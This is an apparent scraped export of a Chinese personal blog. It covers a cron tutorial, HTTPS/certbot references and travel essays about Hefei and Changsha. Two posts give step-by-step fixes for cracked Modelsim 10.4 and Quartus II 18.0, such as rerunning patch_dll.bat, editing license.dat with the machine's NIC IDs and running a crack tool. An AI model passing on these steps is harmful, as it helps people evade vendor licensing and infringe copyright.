<p>301 重定向以及 HSTS 等进阶配置：<a href="#2201181434" title="博客域名解析管理与网站 CDN 加速域名配置" class="record-link ">博客域名解析管理与网站 CDN 加速域名配置</a></p>
<h1>本文参考</h1>
<ul>
<li><a href="https://github.com/songquanpeng/one-api">songquanpeng/one-api(github.com)</a></li>
<li><a href="https://stackoverflow.com/questions/53223914/issue-using-certbot-with-nginx">reactjs - Issue using certbot with nginx - Stack Overflow</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/354241539">使用Certbot申请泛域名SSL证书（Let's Encrypt） - 知乎 (zhihu.com)</a></li>
<li><a href="https://certbot.eff.org/instructions?ws=nginx&amp;os=centosrhel8">Certbot Instructions | Certbot (eff.org)</a></li>
<li><a href="https://www.jianshu.com/p/a1cc68c7d916">使用 CertBot 自动更新 Let's Encrypt SSL 证书 - 简书 (jianshu.com)</a></li>
</ul>
<p>我走过的弯路：<a href="https://www.ssls.com/knowledgebase/how-to-install-an-ssl-certificate-on-apache/?msclkid=525823b0c11911ec963df80c642b2f69">How to install an SSL Certificate on Apache – HelpDesk SSLs.com</a></p>


                
            </main>

            <footer class="list-content-container">
                
                <details class="record-links" open="open">
                    <summary class="menu-title">
                        links
                        <span class="badge">3</span>
                    </summary>

                    <ul class="record-links-list">
                        
                        <li data-target-id="2062987538">
                            <a href="#2062987538">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_wordpress);">⬤</span>
                                    
                                </span>
                                
                                <span>WordPress 使用 HTTPS</span>
                                
                                <div class="record-links-context hover">
                                    <p>WordPress 博客网站使用 HTTPS：<a href="#2062987538" title="WordPress 使用 HTTPS" class="record-link highlight">WordPress 使用 HTTPS</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="2201181434">
                            <a href="#2201181434">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                </span>
                                
                                <span>博客域名解析管理与网站 CDN 加速域名配置</span>
                                
                                <div class="record-links-context hover">
                                    <p>301 重定向以及 HSTS 等进阶配置：<a href="#2201181434" title="博客域名解析管理与网站 CDN 加速域名配置" class="record-link highlight">博客域名解析管理与网站 CDN 加速域名配置</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="2287168649">
                            <a href="#2287168649">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_工具箱);">⬤</span>
                                    
                                    <span style="color: var(--n_核心协同);">⬤</span>
                                    
                                </span>
                                
                                <span>Linux 使用 Cron 创建定时任务</span>
                                
                                <div class="record-links-context hover">
                                    <p>certbot 部署的证书有效期为 3 个月，在过期前 1 个月会收到提示。我们可以重新运行 <code>certbot --nginx</code> 对相应的证书进行更新。或者结合 cron 定时任务完成自动更新。cron 用法详见：<a href="#2287168649" title="Linux 使用 Cron 创建定时任务" class="record-link highlight">Linux 使用 Cron 创建定时任务</a>。</p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">3</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="1032806896">
                            <a href="#1032806896">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_undefined);">⬤</span>
                                    
                                </span>
                                
                                <span>Ant Design Pro 前端项目初始化到部署上线</span>
                                
                                <div class="record-links-context hover">
                                    <p>上面是配置文件关键内容写法，端口号什么的自行补充。上面的配置可以使用 certbot 工具启用 HTTPS。详看：<a href="#1867823418" title="Linux 服务器 HTTPS 的配置" class="record-link highlight">Linux 服务器 HTTPS 的配置</a>。</p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="2062987538">
                            <a href="#2062987538">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_wordpress);">⬤</span>
                                    
                                </span>
                                
                                <span>WordPress 使用 HTTPS</span>
                                
                                <div class="record-links-context hover">
                                    <p>[^1]: 参考<a href="#1867823418" title="Linux 服务器 HTTPS 的配置" class="record-link highlight">Linux 服务器 HTTPS 的配置</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="2346883624">
                            <a href="#2346883624">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_百味人生);">⬤</span>
                                    
                                    <span style="color: var(--n_社会生活);">⬤</span>
                                    
                                </span>
                                
                                <span>成为一名个人博客网站站长</span>
                                
                                <div class="record-links-context hover">
                                    <p>参看我的另一篇文章：<a href="#1867823418" title="Linux 服务器 HTTPS 的配置" class="record-link highlight">Linux 服务器 HTTPS 的配置</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="2287168649" class="record">
            <header>
                <h1 class="record-title">Linux 使用 Cron 创建定时任务</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>工具箱, 核心协同</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('Cron');">Cron</button>
                    
                    <button class="btn" onclick="activeTag('crontab');">crontab</button>
                    
                    <button class="btn" onclick="activeTag('linux');">linux</button>
                    
                    <button class="btn" onclick="activeTag('Python');">Python</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>12/6/2023</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/20231206205902.webp</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>快速上手 Linux 定时任务的创建。</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>88536c89</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <h1>什么是 Cron？</h1>
<h2>Cron 的简介</h2>
<p>Cron 是类 Unix 操作系统（包括 Linux 和 macOS）中基于时间的作业调度器。它允许用户调度作业 (命令或脚本) 在固定的时间、日期或间隔内定期运行。它最常用于自动化系统维护或管理任务，但也可以用于任何需要定期、计划执行命令的情景。</p>
<h2>关于 Cron 的概念</h2>
<p>cron 有 crond 和 crontab 两个概念。</p>
<ul>
<li>crond （cron daemon）：Cron 的核心，即后台守护进程。用来实际执行脚本，它在系统中是一直运行的，与 windows 的计划任务类似。它每分钟都会检查 crontab 文件或目录中的工作。</li>
<li>crontab（cron table）：一个工具，它包含所有需要定时执行命令的列表。用来管理定时任务列表，比如添加作业、编辑作业、删除作业、查看作业。作为管理工具，不会后台运行，需要手动调用，执行完自动退出。</li>
</ul>
<p>crond 默认没有开启，需要手动启动一次服务。服务启动后，会一直运行，即便是重启系统，也会自动运行。相关命令使用 <code>systemctl</code> 执行：</p>
<ul>
<li>启动服务：<code>systemctl start crond</code></li>
<li>关闭服务：<code>systemctl stop crond</code></li>
<li>重启服务：<code>systemctl restart crond</code></li>
</ul>
<h1>Cron 表达式</h1>
<p>cron 表达式是广义的，它包括了狭义的 cron 表达式和 crontab 表达式。这里介绍 crontab 表达式。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231206205307.webp" alt="image.png"></p>
<p>cron 的定时任务需要在作业文件中设定执行时间，包括时分秒、天数等，一共 7 个部分，格式如下：</p>
<p><code>分 时 日 月 星期 [年] 命令</code></p>
<ul>
<li>分：必须，可选 0-59，可设置 <code>,-*/</code> 特殊字符</li>
<li>时：必须，可选 0-23，可设置 <code>,-*/</code> 特殊字符</li>
<li>日：必须，可选 1-31，可设置 <code>,-*?/LW</code> 特殊字符</li>
<li>月：必须，可选 1-12 或 jan-dec，可设置 <code>,-*/</code> 特殊字符</li>
<li>星期：必须，可选 0-7 或 sun-sta，可设置 <code>,-*?/L#</code> 特殊字符</li>
<li>年：非必须，可留空，可设置 1970-2099，可设置 <code>,-*/</code> 特殊字符</li>
</ul>
<p>特殊字符的含义：</p>
<ul>
<li><code>*</code> 全部。意思是在该时间的任意点都应当执行</li>
<li><code>?</code> 不指定，任意。仅用于 日（月）和日（周）。<code>0 0 5 * ?</code> 代表每个月的第 5 天零点，不论星期几。</li>
<li><code>,</code> 多个值的分隔符</li>
<li><code>-</code> 代表连续值，例如 <code>1-20</code></li>
<li><code>/</code> 步长。</li>
<li><code>L</code> 最后一天。可以是每月最后一天或者每周最后一天。如果用在 天 (周) 字段，并且前面加数字，则表示最后一个周 N。</li>
<li><code>W</code> 工作日，指周一到周五的任意一天</li>
<li><code>#</code> 表示第几个的意思，例如 <code>6#3</code>，表示当月第 3 个星期六</li>
</ul>
<p>你可以自行搜索在线工具进行解析含义：比如 <a href="https://tool.lu/crontab/">crontab执行时间计算 - 在线工具 (tool.lu)</a></p>
<h1>简单实操</h1>
<p>例如，我们打算使用 Python 执行一个非常简单脚本，每分钟执行一次。</p>
<p>内容如下：</p>
<pre><code class="language-python">def main():
    print(&quot;Hello World&quot;)
if __name__ == '__main__':
    main()
</code></pre>
<p>我们可以现在命令行测试我们要执行的命令是否成功：</p>
<pre><code class="language-sh">/usr/bin/python /var/www/push_script/hello/hello.py &gt;&gt; /var/www/push_script/hello/hello.log
</code></pre>
<p>测试无误后，编写一个 cron 文件：</p>
<pre><code class="language-cron">* * * * * /usr/bin/python /var/www/push_script/hello/hello.py &gt;&gt; /var/www/push_script/hello/hello.log
</code></pre>
<p>注意命令的路径请使用绝对路径。可以使用 <code>#</code> 进行注释。</p>
<blockquote>
<p>[!hint] 为避免潜在的风险与歧义，建议总是使用绝对路径执行命令。</p>
</blockquote>
<p>添加定时任务：</p>
<pre><code class="language-sh">crontab hello.cron  # 添加一个定时任务
crontab -l          # 查看定时任务是否已加入系统中
crontab -e          # 编辑任务
crontab -r          # 删除所有作业。如果只删除部分，需要通过编辑来实现。
</code></pre>
<p>查看 linux 定时任务日志查看是否已执行：</p>
<pre><code class="language-sh">tail -f /var/log/cron
</code></pre>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231206201940.webp" alt="image.png"></p>
<p>查看 log 的写入情况：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231206202037.webp" alt="image.png"></p>
<h1>本文参考</h1>
<ul>
<li><a href="https://blog.csdn.net/wqc19920906/article/details/119764643">关于linux定时任务crontab运行PYTHON脚本不生效，但是手动执行却正常的问题_crontab 执行多个py文件不生效_jcpp9527的博客-CSDN博客</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/353029881">Linux Cron 定时任务 - 知乎 (zhihu.com)</a></li>
<li><a href="https://www.cnblogs.com/GarrettWale/p/16256688.html">crontab和cron表达式详解 - Garrett_Wale - 博客园 (cnblogs.com)</a></li>
<li><a href="https://blog.csdn.net/wd2011063437/article/details/78960668">linux命令——crontab的使用方法_crontab 用法-CSDN博客</a></li>
<li><a href="https://linuxiac.com/how-to-use-cron-and-crontab-on-linux/">How to Use Cron on Linux: Tips, Tricks, and Examples (linuxiac.com)</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">3</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="888931094">
                            <a href="#888931094">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_工具箱);">⬤</span>
                                    
                                    <span style="color: var(--n_核心协同);">⬤</span>
                                    
                                </span>
                                
                                <span>go-cqhttp 部署与简单编程</span>
                                
                                <div class="record-links-context hover">
                                    <p>然后将运行 python 脚本的任务添加到 crontab 中实现定时启动（参考：<a href="#2287168649" title="Linux 使用 Cron 创建定时任务" class="record-link highlight">Linux 使用 Cron 创建定时任务</a>）</p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="1867823418">
                            <a href="#1867823418">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_undefined);">⬤</span>
                                    
                                </span>
                                
                                <span>Linux 服务器 HTTPS 的配置</span>
                                
                                <div class="record-links-context hover">
                                    <p>certbot 部署的证书有效期为 3 个月，在过期前 1 个月会收到提示。我们可以重新运行 <code>certbot --nginx</code> 对相应的证书进行更新。或者结合 cron 定时任务完成自动更新。cron 用法详见：<a href="#2287168649" title="Linux 使用 Cron 创建定时任务" class="record-link highlight">Linux 使用 Cron 创建定时任务</a>。</p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="3118126311">
                            <a href="#3118126311">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_工具箱);">⬤</span>
                                    
                                    <span style="color: var(--n_核心协同);">⬤</span>
                                    
                                </span>
                                
                                <span>利用 Cron 编写简单的定时脚本（含简易的 CDN 攻击预警）</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>不了解 cron 可以查看这篇文章：<a href="#2287168649" title="Linux 使用 Cron 创建定时任务" class="record-link highlight">Linux 使用 Cron 创建定时任务</a></p>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="1781465711" class="record">
            <header>
                <h1 class="record-title">Modelsim 10.4 破解过程中找不到 License 的解决办法【虚拟机网络设置问题】</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>嵌入式</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('破解');">破解</button>
                    
                    <button class="btn" onclick="activeTag('Modelsim');">Modelsim</button>
                    
                    <button class="btn" onclick="activeTag('问题解决');">问题解决</button>
                    
                    <button class="btn" onclick="activeTag('安装');">安装</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>12/9/2023</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/modelsimcover.webp</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>找不到 License 的一种解决方法以及卸载方法</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>6a2f026f</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <h1>问题排查</h1>
<p>按照 <a href="https://blog.csdn.net/Lily_9/article/details/80325362">网上的安装和破解流程</a> 后，仍运行错误，找不到 License。</p>
<p>首先请依次尝试以下解决方法：</p>
<ul>
<li>【文件权限与环境变量的设置问题】： <a href="https://blog.csdn.net/Lily_9/article/details/80325362">【FPGA——工具篇】：Modelsim SE-64 10.4下载、破解、安装过程_modeslim和quarters18-CSDN博客</a> 可顺便看文章评论区。</li>
<li>【导入 License 的方式问题】：<a href="https://blog.csdn.net/vistayi/article/details/102966383">Modelsim 10以上版本在WIN10下找不到LICENSE的解决办法_run lmutil lmdiag to-CSDN博客</a> 可顺便看文章评论区。</li>
</ul>
<p>如果还是不行，考虑一下你本机<strong>是否装有虚拟机软件</strong>。比如我就装有 VMware，尝试一下禁用虚拟机网络设置。</p>
<p>比如这位老哥的评论：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231209204437.webp" alt="image.png|500"></p>
<p>因为之前偶然注意到 VMware 即使不用也会有开机启动的任务项，所以我怀疑这个问题的真正解决方案与此有关。</p>
<h1>关闭虚拟机相关的网络设置</h1>
<p>本操作的核心在于<strong>关闭虚拟机相关的网络设置</strong>，请根据具体情况进行处理。我直接在火绒安全的启动项管理中，禁用以下服务：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231209204559.webp" alt="image.png"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231209204654.webp" alt="image.png"></p>
<p>然后再运行 <code>patch_dll.bat</code>，进行 License 的生成。明显感觉生成速度变慢了，这时候生成的 License 才是有效的。</p>
<p>这时候打开软件就成功了！</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231209204823.webp" alt="image.png"></p>
<blockquote>
<p>弄好了之后可以把相关的启动项给调回来。</p>
</blockquote>
<h1>附：Modelsim 卸载方法</h1>
<p>打开这个文件夹：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231209204943.webp" alt="image.png"></p>
<p>执行这个：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231209205012.webp" alt="image.png"></p>
<p>根据提示删除相关产品，同时留意提示手动删除部分文件夹。</p>
<p>并且根据提示还可以进一步把安装工具给卸了。</p>


                
            </main>

            <footer class="list-content-container">
                

                
            </footer>
        </article>
        
        <article id="2099001034" class="record">
            <header>
                <h1 class="record-title">Quartus II 18.0 出现 Current license file does not support the XXX device 问题的解决</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>嵌入式</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('Quartus II');">Quartus II</button>
                    
                    <button class="btn" onclick="activeTag('破解');">破解</button>
                    
                    <button class="btn" onclick="activeTag('问题解决');">问题解决</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>12/16/2023</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/20231216173909.webp</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>重新设置一下NIC，并运行破解程序</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>7d1c36ca</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <p>使用 Quartus II 18.0 破解版。但是在 Compilation 时不成功。Fitter 步骤报错：</p>
<blockquote>
<p>[!error] 报错<br>
Error (119013): Current license file does not support the EP4CGX15BF14C6 device. Go to the Self-Service Licensing Center on the Intel FPGA website to manage your licenses (<a href="https://mysupport.altera.com/AlteraLicensing/license/index.html">https://mysupport.altera.com/AlteraLicensing/license/index.html</a>).</p>
</blockquote>
<p>这应该是破解不成功。</p>
<p>重新进行以下破解步骤：</p>
<ol>
<li>打开 Tools &gt; Options &gt; License Setup</li>
</ol>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231216172806.webp" alt="image.png"></p>
<p>教程里是只复制一个 NIC，现在我们复制所有 NIC，逗号、空格原封不动复制。</p>
<ol start="2">
<li>修改 license.dat，原封不动替换</li>
</ol>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231216173017.webp" alt="image.png"></p>
<ol start="3">
<li>重新运行破解器。这时我直接双击打开，不用以管理员权限运行。</li>
</ol>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231216173156.webp" alt="image.png"></p>
<ol start="4">
<li>要确确实实弹出「破解成功」字样才算破解成功：</li>
</ol>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231216173326.webp" alt="image.png|362"></p>
<ol start="5">
<li>最后运行 Quartus II</li>
</ol>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231216173512.webp" alt="image.png|375"></p>
<p>出现破解公司的水印，说明破解成功。</p>
<p>我的小小 38 译码器也能正常 Compilation 了：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231216173614.webp" alt="image.png"></p>
<h1>本文参考</h1>
<ul>
<li><a href="https://blog.csdn.net/BLACKHOLE6/article/details/104844449">蛋疼的问题：Error (119013): Current license file does not support the EP4CE10F17C8 device-CSDN博客</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                

                
            </footer>
        </article>
        
        <article id="3332201227" class="record">
            <header>
                <h1 class="record-title">巢湖日落</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>undefined, 有感而发</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('合肥');">合肥</button>
                    
                    <button class="btn" onclick="activeTag('巢湖');">巢湖</button>
                    
                    <button class="btn" onclick="activeTag('美术馆');">美术馆</button>
                    
                    <button class="btn" onclick="activeTag('元旦');">元旦</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>1/1/2024</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/IMG_20240101_170916.webp</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>记录别人的幸福也很幸福</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>c69d5b0b</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <p>新年第一天，像往常一样睡了个「大好的觉」。看着外面的霾和空气质量，犹豫许久还是决定出发，好好享受自己的假期。目前这段时光是我停留在合肥的最后时光。2024 的第一站，我决定去巢湖看一看。</p>
<p>所有装备都考虑到了，尤其是保暖装备和防霾装备。小单车加地铁，我来到了巢湖边。这里是合肥东南侧，也算是一个小型「文化中心」了。这一带有渡江战役纪念馆、纪念碑、科技馆、名人堂以及安徽美术馆。一口气吃不了太多，我还是先逛逛美术馆吧。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/IMG_20240101_143959.webp" alt="IMG_20240101_143959.jpg|475"></p>
<p>今天虽然是周一，但元旦各大场馆继续开馆。美术馆有 5 层，在我看来并不算大。依看展的经验，进馆开始的一段时间内是精力最充足、最有可能收获到东西的时间。到后面就会审美疲劳，无心停留（之后也确实应验了）。因此鲍佳的版画展到现在还是留有一点印象的。</p>
<p>鲍佳让我加深对版画的认识，版画风格很独特，有棱有角的。中间我也冒出一个想法，这些应该 AI 也能生成吧。很快我又打断自己的更深的念头，因为这又会陷入到模糊的无休止的终极意义的思考当中。朱松发画画喜欢一边写字一边画，反正就是要填满，不知道这是什么风格。顶楼有当地高校的一个作品展，挺不错，看着有趣。要不是听到一个女生向她的同学吐槽我也才意识到，整个美术馆画展「老子出关」图多次出现，且图片的内容都差不多：老子骑牛。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/IMG_20240211_034126.webp" alt="IMG_20240211_034126.jpg|475"></p>
<p>小时候理解的元旦是一个特殊的时刻。我会在零点来临前看钟，等到 0 时 0 分那一刻，似乎会有一根神奇的线条从远方来，快速划过每一件事物，并将它们更新到新的一年中。我在房间里感受线的存在与跨线尾迹，在脑中的思绪中完成跨年。</p>
<p>但是现在，这一时刻越来越不重要了。也许是做完工作、打完游戏、洗个澡、看个剧，然后再看会手机，才知道新年匆匆到来。昨夜的合肥是热闹的：岸上草原的烟花，淮河路步行街的气球、拥挤的车流和人群。但就是昨晚，莫名奇妙的有一种焦虑感，一种仪式缺失的感觉。2023 最后的几个小时，游戏不想打、资料不想看、不想看短视频、不想外出、不想受累，想为自己弄点仪式，但新年还是太快。最终选择看剧——一个不需要花力气但能吞噬时间的神器。</p>
<p>研究生的第一学期和本科第一学期的心境很相像，新的城市、新的校园、新的生活、新的人。19 年的元旦前夕，我也恰巧独自徘徊在津湾广场附近，静看夜色下绚烂的海河两岸。无意间发现，世纪钟的人逐渐增多，相关管制措施也逐渐建立，五星红旗开始聚集。我正好处在一个跨年热点的正中心。我第一个念头是选择留下，但限于对规章制度的遵守，还是离开了。退场的落寞也只有在那一刻能体会。</p>
<p>美术馆看完了，我重新回到渡江战役纪念馆前的广场。渡江战役纪念馆越看越饿，可能是因为长得太像三明治了吧。当然我也不忘记此程最终的目的——看巢湖。也是接近日落时分了，不如顺带看一次巢湖的日落。我以为能像太湖一样，可以看到一望无际的大水湖。但是在这个观景台，湿地植物阻止了我这个想象。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/IMG_20240101_165631.webp" alt="IMG_20240101_165631.jpg|450"></p>
<p>我站在观景台上，看着东方的景象。一对情侣出现在下方的亲水步道上，像我一样也为这霾中的夕阳停留。他们每人都牵着爱心形状的气球，好像是刚从昨晚的淮河路中疏散出来一样。我拿起相机，打算记录这温馨的一刻。我努力尝试将湖水上的夕阳与这对情侣放在同一个取景框中，囊括太阳、湖、气球、人。但是最令我意想不到的事情发生了，他们选择放飞了气球。在我意识到这是一个关键时刻时，我着急按下快门，并用指尖视图唤醒手机的正确调焦。但是等到手机清晰的时候，取景框只能容纳气球了。</p>
<p>这真是一个幸福又浪漫的时刻。我能想象到，他们可能没有选择去昨晚热闹的淮河路，而是特地来这人烟稀少的巢湖边放气球，共同渡过属于他们的幸福时光。幸福不一定需要更多人的见证。幸运的是，这一时刻只有我记录了下来。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/IMG_20240101_170532.webp" alt="IMG_20240101_170532.jpg|425"></p>
<p>晚上计划看一次学校西校区的合唱。交通、晚餐有点急，到了那人生地不熟的，凭感觉寻路。去到大厅时也只能坐在后面了。整场音乐会感官不错，赏心悦目。种草了一首歌曲《借我》（夏炎彬作曲，不是另一首同名流行歌）[^jiewo]，在各大平台找到的合唱片段寥寥，找半天只有 <a href="https://www.bilibili.com/video/BV1tp4y1u7eJ/?spm_id_from=333.337.search-card.all.click&amp;vd_source=e03d48176855fc5349b27aef691f9cdb">这个</a> 还不错（但是有咳嗽声😫，不能容忍）。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/IMG_20240101_195002.webp" alt="IMG_20240101_195002.jpg|500"></p>
<p>元旦第一天，就是一场艺术浪漫之旅。</p>
<blockquote>
<p>躺在床上了。新年第一条坏消息，竟是青春科大没计算上我的二课时长😡。</p>
</blockquote>
<p>[^jiewo]: 过了许久才找到回放：<a href="https://www.bilibili.com/video/BV1Vt421p7Un/?spm_id_from=333.337.search-card.all.click&amp;vd_source=e03d48176855fc5349b27aef691f9cdb">【中国科大合唱】“借我一场秋啊，可你说这已是冬天”| 借我 | 2024“星声”新年音乐会_哔哩哔哩_bilibili</a></p>


                
            </main>

            <footer class="list-content-container">
                

                
            </footer>
        </article>
        
        <article id="1637153567" class="record">
            <header>
                <h1 class="record-title">穷游长沙</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>undefined, 有感而发</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('长沙');">长沙</button>
                    
                    <button class="btn" onclick="activeTag('旅行');">旅行</button>
                    
                    <button class="btn" onclick="activeTag('城市印象');">城市印象</button>
                    
                    <button class="btn" onclick="activeTag('博物馆');">博物馆</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>2/11/2024</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/IMG_20240116_204532.webp</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>走路不带停的这是一种什么样的体验</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>6194fb1f</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <blockquote>
<p>[!success] 文章不含高能图片，可放心食用。<br>
因为旅行途中参观了马王堆而特此提醒。如果想看高能图片可以自行百度。</p>
</blockquote>
<p>离开合肥前我便开始规划我的下一个假期旅行目的地：武汉 or 长沙。考虑到交通与景点数，我打算在长沙度过几天。</p>
<p>这应该是我第一次独自旅行。有了上一年的经历铺垫，我完全有能力独自玩好公共交通方便的城市（有地铁的城市）。来长沙前我特地咨询我的湖南舍友，他给我发来一张图。长沙市内可玩的景点围绕着五一广场展开。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240217024254.webp" alt="image.png|300"></p>
<h1>Day 0 长沙的夜</h1>
<p>从合肥到长沙两三个小时高铁就行。到达长沙南站时天都没黑完。住宿我选择就在火车站旁，方便回程交通。但是第一个交通问题就把我难住了——怎么走出长沙南站😅。来到长沙南站的地面，根本就没有过马路的机会，在复杂的地面地下通道的交错下，以及理论与现实的出现差别的情况下，高德地图失效了。我被长沙之旅的第 100m 困住了（一小会😜）。</p>
<p>虽说这时候高德地图没有起到准确导航的作用，但我也没有吐槽它的意思，该准的时候也是挺准的，比如对时长的估计以及在无锡时初次体验的红绿灯读秒。但我确实由于依赖此类地图软件出现过不少慌乱害怕的体验。比如它会标注一些可怕陌生的小黑路，以及很少人选择的交通路线，又或者是通道口信息更新不及时让你立刻陷入战备状态等。但除了在个别的情况下，高德确实能解决实际问题，只是考验用户胆子而已。</p>
<p>通过观察指引标识加上导航方向的配合，穿过有点恐怖的迷宫一样的地下通道后，我终于把行李抬上了地面。住宿附近的环境和软件上展示的差不多。单晚不算贵，且房间挺大的，17 楼的落地窗可以俯瞰长沙南，心旷神怡不压抑，但周围荒地没啥好看的。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/IMG_20240116_180218.webp" alt="IMG_20240116_180218.jpg|500"></p>
<p>现在才六七点，去到闹区也就半小时，比天津合肥那种情况近多了。说走就走，长沙第一步就去五一广场吧！初来乍到，按地图行事。看着地图哪里顺眼就往哪里走，其实我真的很希望导航软件能出个热力图功能，逛闹市我更喜欢多人的气氛。第一眼的五一广场有点奇妙，人是很多人，车来车往很繁忙。气球、人偶、车鸣、音响，好不热闹。过了马路和一个变形金刚打了招呼哈哈。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/IMG_20240116_200204.webp" alt="IMG_20240116_200204.jpg|500"></p>
<p>从五一广场站走到国金中心这一段路和南宁闹区很像，一段比较高级的主路中，第一分叉为各色望不到头的小吃街，小吃街的第二分叉就是漆黑的小巷。我选择在一家看起来不会那么贵的粉店里解决我的晚餐。这杀猪粉好像在南京吃过，符合我的口味，就是不知道什么调味椒（胡椒吧？）放得有点多了。吃完后就点了我第一杯茶颜悦色，整个点单的流程蛮新奇的，我也被推荐吃了吃他们的面包干，还真不错。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240216230522.webp" alt="image.png|500"></p>
